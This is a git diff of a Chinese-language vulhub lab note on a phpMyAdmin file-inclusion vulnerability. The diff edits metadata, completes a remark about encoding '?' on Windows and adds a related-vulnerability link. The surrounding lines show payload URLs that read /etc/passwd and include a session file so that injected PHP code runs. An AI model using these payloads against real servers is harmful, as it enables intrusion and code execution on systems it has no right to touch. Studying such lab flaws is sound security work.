@@ -5,7 +5,7 @@ tags:
   - sec/vulhub
   - sec/cve
 date: 2024-09-18T15:33:13
-lastmod: 2024-09-19T22:08:19
+lastmod: 2024-09-19T22:09:05
 toc: "true"
 draft: "false"
 ---
@@ -73,7 +73,7 @@ $target_blacklist = array (
 然后就是在phpmyadmin中,执行sql语句之后,会存储在session文件中,如果包含这个文件,就能让select里面的php代码被执行
 ```bash
 /index.php?target=db_sql.php?/../../../../../../../../etc/passwd
-#Windows环境下利用需要对?
+#Windows环境下利用需要对?进行编码
 /index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_21faa6130eaba2b5e04e313bfacc60d4
 ```
 
@@ -81,7 +81,8 @@ $target_blacklist = array (
 进入后台之后,查看版本信息
 ## 漏洞修复
 升级phpmyadmin版本
-
+##  相关漏洞
+[phpMyAdmin_4.0.x—4.6.2_远程代码执行漏洞](phpMyAdmin_4.0.x—4.6.2_远程代码执行漏洞.md)
 
 ## 漏洞总结
 这个漏洞刚刚演练的时候利用过,比较熟悉了...
